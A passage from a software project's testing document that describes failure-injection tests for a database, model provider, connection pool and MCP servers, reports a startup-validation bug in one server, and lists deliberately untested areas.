| **Postgres** | `tests/unit/test_failure_injection.py` | `/health` answers 200 *while* `/ready` answers 503 — and readiness returns to 200 on its own once the database is back |
| **The model provider** | same | The stream ends in exactly one `error`, emits **no `rows`**, and the *next* request is served |
| **The connection pool** | same | Saturation becomes a domain error, and is audited even though nothing ran |
| **The MCP servers** | `tests/contract/test_mcp_process_death.py` | All four launched as real subprocesses against a closed port: each exits non-zero, and **stdout stays empty** |

**The interesting assertion is almost never about the failing request.** That a single call returns an error is easy, and §3's suites already cover it. What was missing is the state the process is left in: whether the next caller is served, whether a slot came back, whether an outage makes an unauthenticated probe *more* expensive, and whether a failure that never reached the database still left an audit row. Every one of those is invisible when you look at one request.

**Progress may be partial; data may not.** A caller that saw `retrieve` complete and then an `error` knows exactly what happened. A caller that saw a `rows` event and then an `error` has to decide whether to believe the rows, and there is no right answer to that question — so the suite asserts the stage events survive a failure and the data events do not.

**Recovery is tested in both directions.** Down, up, and down again. A `self._healthy = True` that is never cleared passes a recovery test and fails the second transition, and everything about a probe is easy to get right on the way down.

**Failures are cached like successes**, and there is a test saying so. Caching only successes looks like an improvement — retry the broken thing more often, notice recovery sooner — and converts an unauthenticated endpoint into an amplifier at the moment the database is least able to absorb one.

### What it found

`mcp_servers.schema_search` **started cleanly against an unreachable database and exited 0.** The other three died at startup, exactly as all four `__main__` docstrings promise in identical words:

> Resources are built here so a bad `DATABASE_URL` kills the process while the host is starting it, rather than surfacing as a tool error on the first call that the agent will try, and fail, to correct its way out of.

The difference was incidental rather than designed. `validate_sql`, `execute_sql` and `profile_table` construct a component that takes a connection as a constructor argument, so `build()` opens one as a side effect. `schema_search` closed over `resources` and reached for `resources.retriever` **inside the handler** — and `Resources` connects on first use. Nothing opened, nothing failed, and the process went on to serve a tool that could not work.

The consequence is exactly what the docstring says it prevents: the host advertises `search_schema`, the agent calls it, gets an infrastructure error, and **self-corrects** — rewriting a perfectly good query, spending a generation per attempt, and eventually reporting that it could not answer.

**This is the third instance of the same shape in this project.** A lazily-resolved resource that nothing forces at startup: first the retriever whose checkpoint loaded on the first request and charged that caller twenty seconds (§11), then the property read for its *name* rather than for the side effect of reading it, now a server that never touched a resource at all. The fix is the same each time — resolve it in `build()`, and read the property whose side effect is the point.

**Not written up as a security finding**, and the reason is worth stating rather than leaving to inference: it exposes nothing, requires an already-misconfigured deployment, and its worst outcome is wasted provider quota. Availability of a tool in a broken deployment is a reliability defect. Filing it under §14 would dilute a document whose findings are all reachable by an actual adversary.

### The limit, stated

**Nothing here kills a real process or a real container — except the MCP suite, which is why that half is the stronger one.** Failures are injected as the application *observes* them: a connection that raises, a provider that raises, a pool with nothing left. The `testcontainers` Postgres is session-scoped, so stopping it would poison every test that ran after it; a real database killed mid-query needs its own container and its own slice.

Also not injected, and named in the module docstring rather than left to be inferred from absence: a **slow** dependency as opposed to a failing one, a peer that accepts a connection and never answers, and disk or memory pressure.

## 12. What is not tested

Stated so the gap is deliberate rather than accidental:

- **LLM output quality.** Measured by the eval harness, not asserted in tests.
- **Prompt effectiveness.** Same — a prompt change is validated by an eval run.
- **Third-party library correctness.** sqlglot's parser is trusted; `EXPLAIN` is the second opinion. **Its error *surface* is not trusted, and that distinction was bought the hard way** — see §15 on `TokenError`. Two known limitations are recorded rather than worked around: `ORDER /* c */ BY` is legal PostgreSQL that sqlglot cannot parse, and an unmodelled statement becomes an opaque `exp.Command` that the validator refuses on principle.
- **Postgres itself.** The privilege system is the foundation, not a subject.
- **The UI's appearance.** See §13 — verified by looking at it, and said so plainly rather than approximated with snapshots.
- **Three of the four MCP servers over the wire.** `schema_search` is measured: `tests/integration/test_mcp_eval_baseline.py` proves a real subprocess returns what the in-process retriever returns, and [BENCHMARKS §8](../ml/BENCHMARKS.md) extends that to all 1,034 dev questions. `validate_sql`, `execute_sql` and `profile_table` cross the contract suite and no benchmark — a baseline moving two hops at once could not attribute a difference to either, so each needs its own row.
